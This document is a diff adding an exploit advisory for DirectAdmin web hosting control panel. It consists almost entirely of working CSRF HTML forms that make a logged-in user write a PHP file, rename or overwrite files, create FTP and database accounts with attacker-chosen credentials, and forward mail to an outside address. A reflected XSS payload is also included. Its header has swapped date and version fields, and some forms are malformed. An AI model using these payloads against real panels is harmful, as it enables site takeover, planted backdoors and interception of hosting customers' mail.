@@ -1,0 +1,94 @@
+=============================================================================
+[+] Exploit Title : DirectAdmin Web Control Panel CSRF/XSS vulnerability
+[+] Exploit Author : Ashiyane Digital Security Team
+[+] Date : 1.483
+[+] Version : 2015/09/08
+[+] Tested on : Elementary Os
+[+] Vendor Homepage : http://www.directadmin.com/
+=============================================================================
+[+] Introduction : 
+DirectAdmin is a graphical web-based web hosting control panel designed to make administration of websites easier.
+DirectAdmin suffers from cross site request forgery and cross site scripting vulnerabilities
+=============================================================================
+[+] CMD_FILE_MANAGER :
+[+] Users : Users are web hosting clients.  They use DirectAdmin to configure their web site
+[+] Exploit 1: Create New File and Edit a file
+<form name=info action='http://address:port/CMD_FILE_MANAGER' method='POST'>
+<input type="hidden" name="action" value="edit">
+<input type="hidden" name="path" value="/domains/address/public_html">
+<input type="hidden" name="text" value="<?php //codes ?>">
+<input type="hidden" name="filename" value="index.php">
+<input type="submit" onClick="save=0;" value="Save As">
+ -----------------------------------------------------------------------------
+[+] Exploit 2: Create a New Folder 
+<form name=folderform action="/CMD_FILE_MANAGER" method="POST">
+<input type="hidden name=action value="folder">
+<input type="hidden name="path" value="/domains/iceschool.ir/public_html">
+<input type="hidden" name="name" value="Folder">
+<input type=submit value="Create">
+</form>
+ -----------------------------------------------------------------------------
+[+] Exploit 3: Rename a file
+<form name=info action='http://address:port/CMD_FILE_MANAGER' method='POST'>
+<input type=hidden name=action value="rename">
+<input type="hidden" name="path" value="/domains/address/public_html">
+<input type="hidden" name="old" value="Oldname">
+<input type="hidden" name="filename" value="Newname">
+<input type="hidden" name="overwrite" value="yes">
+<input type="submit" value="Rename">
+</form>
+-----------------------------------------------------------------------------
+[+] Exploit 4  : Reflected XSS 
+<form name='info' action='http://address:port/CMD_FILE_MANAGER' method='POST'>
+<input type="hidden" name="action" value="edit">
+<input type="hidden" name="path" value='/xss/"><script>alert(/XSS Vuln/)</script>'>
+<input type="hidden" name="text" value="xss">
+<input type="hidden" name="filename" value="xss">
+<input type="submit" onClick="save=0;" value="Save As">
+</form>
+
+=============================================================================
+[+] CMD_FTP :
+[+] Users : Users are web hosting clients.  They use DirectAdmin to configure their web site
+[+] Exploit : Create FTP account
+<form name="reseller" action="http://address:port/CMD_FTP" method="post">
+<input style="display:none" type="text" name="fakeusernameremembered"/>
+<input style="display:none" type="password" name="fakepasswordremembered"/>
+<input type="hidden" name="action" value="create">
+<input type="hidden" name="domain" value="domain.xyz"> <!-- Example : ashiyane.org -->
+<input type="hidden" name="user" value="ehsan">
+<input type="hidden" name="passwd" value="pass1234">
+<input type="hidden" name="passwd2" value="pass1234">
+<input type="hidden" name="type" value="domain" checked>
+<input type="hidden" name="type" value="ftp">
+<input type="hidden" name="type" value="user">
+<input type="hidden" name="type" value="custom">
+<input type="hidden"  name="custom_val" value="/home/domain"> <!-- Example : /home/ashiyane -->
+<input type="submit" name="create" value="Create">
+</form>
+=============================================================================
+[+] CMD_DB :
+[+] Users : Users are web hosting clients.  They use DirectAdmin to configure their web site
+[+] Exploit : Create new Database
+<form name=reseller action="http://address:port/CMD_DB" method="post">
+<input type="hidden" name=action value=create>
+<input type="hidden" name=domain value="domain.xyz"> <!-- Domain -->
+<input type="hidden" name="name" value="dbname"> <!-- Database Name -->
+<input type="hidden" name="user" value="ehsan"> <!-- Username -->
+<input type="hidden" name="passwd" value="pass1234">  <!-- Password -->
+<input type="hidden" name="passwd2" value="pass1234"> <!-- Password -->
+<input type="submit" name="create" value="Create">
+</form>
+=============================================================================
+[+] CMD_DB :
+[+] Users : Users are web hosting clients.  They use DirectAdmin to configure their web site
+[+] Exploit : Create new E-Mail Forwarder
+<form name=info action="CMD_EMAIL_FORWARDER" method="post">
+<input type=hidden name=action value=create>
+<input type=hidden name=domain value="domain.xyz"><!-- Domain -->
+<input type="hidden" name="user" value="info"> <!-- Forwarder Name -->
+<input type="hidden" name="email" value="hehsan979@gmail.com"> <!-- Destination Email -->
+<input type="submit" name="create" value="Create">
+</form>
+=============================================================================
+[+] Discovered By : Ehsan Hosseini (hehsan979@gmail.com)
